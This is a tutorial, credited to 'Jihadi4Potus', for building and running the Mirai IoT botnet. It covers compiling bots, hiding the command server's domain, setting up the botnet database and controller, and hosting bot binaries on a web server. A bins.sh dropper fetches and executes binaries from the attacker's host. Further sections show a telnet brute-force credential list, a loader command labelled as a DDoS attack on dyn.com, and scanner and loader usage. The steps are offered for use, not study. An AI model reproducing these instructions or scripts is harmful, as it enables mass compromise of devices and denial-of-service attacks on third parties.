███╗   ███╗██╗██████╗  █████╗ ██╗    ██████╗  ██████╗ ████████╗███╗   ██╗███████╗████████╗
████╗ ████║██║██╔══██╗██╔══██╗██║    ██╔══██╗██╔═══██╗╚══██╔══╝████╗  ██║██╔════╝╚══██╔══╝
██╔████╔██║██║██████╔╝███████║██║    ██████╔╝██║   ██║   ██║   ██╔██╗ ██║█████╗     ██║  
██║╚██╔╝██║██║██╔══██╗██╔══██║██║    ██╔══██╗██║   ██║   ██║   ██║╚██╗██║██╔══╝     ██║  
██║ ╚═╝ ██║██║██║  ██║██║  ██║██║    ██████╔╝╚██████╔╝   ██║   ██║ ╚████║███████╗   ██║  
╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝    ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝  
 
              ████████╗██╗   ██╗████████╗ ██████╗ ██████╗ ██╗ █████╗ ██╗    
              ╚══██╔══╝██║   ██║╚══██╔══╝██╔═══██╗██╔══██╗██║██╔══██╗██║    
                 ██║   ██║   ██║   ██║   ██║   ██║██████╔╝██║███████║██║    
                 ██║   ██║   ██║   ██║   ██║   ██║██╔══██╗██║██╔══██║██║    
                 ██║   ╚██████╔╝   ██║   ╚██████╔╝██║  ██║██║██║  ██║███████╗
                 ╚═╝    ╚═════╝    ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝
                                                                                                                         
Original version by Jihadi4Potus
 
'Production' Requirements
 2/3 Server (VPS) 
 
 Install:
 MobaXterm & Putty
  
System Requirements:
| OS: Debian 9  86x_64x
| RAM: 8GB / 10GB



-Original Mirai Source - https://github.com/jgamblin/Mirai-Source-Code
 
 
Open Linux machine

# [Step 1] - Get mirai code

--------------------------------------------------------

code:

git clone https://github.com/jgamblin/Mirai-Source-Code

--------------------------------------------------------


 
# [Step 2] - Install required programs 


--------------------------------------------------------
code:

 apt-get update -y
 apt-get upgrade -y
 
 apt-get install gcc electric-fence sudo git wget -y
 
 wget https://dl.google.com/go/go1.15.2.linux-amd64.tar.gz
 
 tar -xvf go1.15.2.linux-amd64.tar.gz
 sudo mv go /usr/local
 
 apt-get install mysql-server mysql-client -y
 

--------------------------------------------------------
 
 
# [Step 3] Installing and compiling the cross-compilers



--------------------------------------------------------
 code:

 mkdir /etc/xcompile
 cd /etc/xcompile
 
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2
 wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2
 
 tar -jxf cross-compiler-armv4l.tar.bz2
 tar -jxf cross-compiler-armv5l.tar.bz2
 tar -jxf cross-compiler-armv6l.tar.bz2
 tar -jxf cross-compiler-i586.tar.bz2
 tar -jxf cross-compiler-i686.tar.bz2
 tar -jxf cross-compiler-m68k.tar.bz2
 tar -jxf cross-compiler-mips.tar.bz2
 tar -jxf cross-compiler-mipsel.tar.bz2
 tar -jxf cross-compiler-powerpc.tar.bz2
 tar -jxf cross-compiler-sh4.tar.bz2
 tar -jxf cross-compiler-sparc.tar.bz2
 tar -jxf cross-compiler-x86_64.tar.bz2
 
 
 rm *.tar.bz2
 mv cross-compiler-armv4l armv4l
 mv cross-compiler-armv5l armv5l
 mv cross-compiler-armv6l armv6l
 mv cross-compiler-i586 i586
 mv cross-compiler-i686 i686
 mv cross-compiler-m68k m68k
 mv cross-compiler-mips mips
 mv cross-compiler-mipsel mipsel
 mv cross-compiler-powerpc powerpc
 mv cross-compiler-sh4 sh4
 mv cross-compiler-sparc sparc
 mv cross-compiler-x86_64 x86_64

--------------------------------------------------------

# [Step 4] -  Add Golang Paths


--------------------------------------------------------
code:

export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
 
export PATH=$PATH:/usr/local/go/bin
export GOPATH=$HOME/Documents/go

go get github.com/go-sql-driver/mysql
go get github.com/mattn/go-shellwords


--------------------------------------------------------


 
# [Step 5]- Build Bot


--------------------------------------------------------
code:

./build.sh debug telnet

--------------------------------------------------------
 
 
 
# [Step 6] - Obfuscate domain string

In /mirai/debug

changeme.com <---- PUT YOUR DOMAIN !!!, use NO-IP for free use.


--------------------------------------------------------
code:
 ./enc string changeme.com
-------------------------------------------------------- 


Copy the resulting code in   ./Mirai-Source-Code/mirai/bot/table.c  file., example:

XOR'ing 20 bytes of data...
\x44\x57\x41\x49\x0C\x56\x4A\x47\x0C\x52\x4D\x4E\x4B\x41\x47\x0C\x41\x4D\x4F\x22




# [Step 7]- Setup Database - step 1




If you have iptbales/ip6tables or any firewall install disable it.


--------------------------------------------------------
code:

service iptables stop
/etc/ini.d/iptbales stop
/usr/bin/mysql_secure_installation
--------------------------------------------------------



# [Step 8] - Database setup - step 2
Edit ( main.go ) file located in ../mirai/cnc/

If MySQL PASSWORD is:
MySQL_Password


The paste data would be:

const DatabaseAddr string   = "127.0.0.1:3306"
const DatabaseUser string   = "root"
const DatabasePass string   = "MySQL_Password"
const DatabaseTable string  = "mirai"


# [Step 9] - Database create users and permissions.

Once you've done the step above were going to add the database and user perms. follow this link.


--------------------------------------------------------
code:
mysql -u root -pMySQL_Password
create database mirai;
use mirai;

CREATE TABLE `history` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL,
  `time_sent` int(10) unsigned NOT NULL,
  `duration` int(10) unsigned NOT NULL,
  `command` text NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`)
);
 
CREATE TABLE `users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(32) NOT NULL,
  `password` varchar(32) NOT NULL,
  `duration_limit` int(10) unsigned DEFAULT NULL,
  `cooldown` int(10) unsigned NOT NULL,
  `wrc` int(10) unsigned DEFAULT NULL,
  `last_paid` int(10) unsigned NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  `admin` int(10) unsigned DEFAULT '0',
  `intvl` int(10) unsigned DEFAULT '30',
  `api_key` text,
  PRIMARY KEY (`id`),
  KEY `username` (`username`)
);
 
CREATE TABLE `whitelist` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(16) DEFAULT NULL,
  `netmask` tinyint(3) unsigned DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `prefix` (`prefix`)
);

--------------------------------------------------------



# [Step 10] - Database create users and permissions.

Change (mirai-user) to a prefered username and password (myawesomepassword) and restart mysql.
--------------------------------------------------------
code:

INSERT INTO users VALUES (NULL, 'mirai-user', 'myawesomepassword', 0, 0, 0, 0, -1, 1, 30, '');
service mysql restart
--------------------------------------------------------


# [Step 11] - Execute the Mirai Iot Botnet server.

In debug folder ./mirai/release ,check if a  compiled file named cnc  exists and execute it.
Results should be http://prntscr.com/dnsluv

--------------------------------------------------------
code:

./cnc
--------------------------------------------------------


# [Step 12] - Move the prompt.txt 

Move the (prompt.txt) file in  ( ../mirai  )  into the ../mirai/release folder

--------------------------------------------------------
code:
cd /home/Mirai-Source-Code/mirai 
mv /home/Mirai-Source-Code/mirai/prompt.txt /home/Mirai-Source-Code/mirai/debug/
--------------------------------------------------------


# [Step13] - Use Putty.

Open Putty and select TELNET and put your IP or your.domain.com
Use the user name and password declared in step 10 to login 
Install server for bot



--------------------------------------------------------
code:

cd ./Mirai-Source-Code/mirai/release
sudo apt-get install apache2 -y
service apache2 start
--------------------------------------------------------------------------------------------

# [Step14] - copy the mirai files at the apache source.

--------------------------------------------------------------------------------------------
code: 

cp mirai.* /var/www/html
 cd ./var/www/html
 ls
--------------------------------------------------------------------------------------------
 

#  [Step15] - Delete the Index.html
 
Delete the index to show the index file directory on browser and check if you can see the files.
 
 --------------------------------------------------------------------------------------------
 code:
 
 rm /var/www/html/index.html
 
 --------------------------------------------------------------------------------------------
  Open a browser and use the ip inputed in step 6 to confirm that you can see the files
 



 

#  [Step16] - create and unpload the bins.sh file
 
To create this file use notepadc++ or a similar editor that can save txt files with a custom extension
 
 Open and create a new document,  paste the following and save as bins.sh
 

  --------------------------------------------------------------------------------------------
 #!/bin/sh

# Edit
WEBSERVER="IP OR HOSTNAME:80"
# Stop editing now 

BINARIES="mirai.arm mirai.m68k miraint.x86 miraint.spc miraint.sh4 miraint.ppc miraint.mpsl miraint.mips miraint.arm7 miraint.arm5n miraint.arm"

for Binary in $BINARIES; do
	wget http://$WEBSERVER/$Binary -O dvrHelper
	chmod 777 dvrHelper
	./dvrHelper
done

rm -f "
 --------------------------------------------------------------------------------------------
 
 

 # [Step 17] - Unpload the bins.sh file
 
 --------------------------------------------------------------------------------------------
 
 /var/www/html/

 --------------------------------------------------------------------------------------------
 
Check if it appears in  http://YOUR.IP.OR.HOSTNAME:80 

 # [Step 18] Restart server
 
 --------------------------------------------------------------------------------------------
 
 code: 
 
 service apache2 restart
 --------------------------------------------------------------------------------------------
 
 
# [Step 19] -  Brute force list

Loader reads telnet entries from STDIN in following format:
 
 ip:port user:pass
 

Create a txt file (file .txt) and upload in this directory ../Mirai-Source-Code/loader/


Example:

212.192.143.174:23 Admin:1234
212.192.143.174:23 Admin:1234
212.192.143.174:23 Admin:1234
212.192.143.174:23 Admin:1234
212.192.143.174:23 Admin:1234
212.192.143.174:23 Admin:1234
212.192.143.174:23 Admin:1234
212.192.143.174:23 Admin:1234
212.192.143.174:23 Admin:1234
 
 
# [Step22] - Build the loader

Open the terminal and go to  ../Mirai-Source-Code/loader/


--------------------------------------------------------------------------------------------
code:

/build.sh
--------------------------------------------------------------------------------------------
 
 

# [Step 20] DDOS Attack (from original tutorial)

--------------------------------------------------------------------------------------------
code:
cat file.txt | ./loader wget http://dyn.com
--------------------------------------------------------------------------------------------


# Scanner and Loader Instructions from (https://github.com/lejolly/mirai)

### Running the bot with scanning enabled
run the bot with the last argument set as `1`
  * arguments: `sudo ./debug/mirai.dbg <cnc ip> <local ip> <callback ip> <enable scanner 0/1>`
  * e.g. `sudo ./debug/mirai.dbg 10.0.0.1 10.0.0.2 10.0.0.1 1`
  * you can also edit [mirai/demo-bot.sh](mirai/demo-bot.sh) to enable the flag for you

using the debug, telnet version, the bot will generate random ip addresses and check if a telnet daemon is running on port 23. it will then use its hardcoded list of logins to try to gain access to the device. 
  * the list of logins is in `scanner_init()` in [mirai/bot/scanner.c](mirai/bot/scanner.c) (use the `enc` tool to convert strings into the required format if you want to add new logins)
  * the range of ip addresses it generates can be set here: `get_random_ip()` in [mirai/bot/scanner.c](mirai/bot/scanner.c)

### Running the callback server
if successful, the bot will then report the vulnerable ip address, along with its login credentials to the callback server. 
  * a simple callback server is found here: [mirai/tools/scanListen.go](mirai/tools/scanListen.go), it is built as `scanListen`
  * run it as: `sudo ./debug/scanListen`
  * it listens on port `48102`

### Running the single loader
the single loader takes a list of input ip addresses, login credentials, and a binary to transmit (usually the bot itself). it then logs into each device on the list and uses telnet to transmit the binary. finally, it then launches the binary with the specified arguments. 
  * it is found here: [mirai/tools/single_load.c](mirai/tools/single_load.c) and is built as `single_load`
  * run it as: `./debug/single_load <bind ip> <input file> <path to file_to_load> <argument> <threads> <connections> (debug mode)`
  * e.g. `./debug/single_load 10.0.0.1 ./debug/input.txt ./debug/mirai.dbg "10.0.0.1 10.0.0.2 10.0.0.1 0" 1 1 1` (having the last argument, of any value, means that it runs in debug mode)
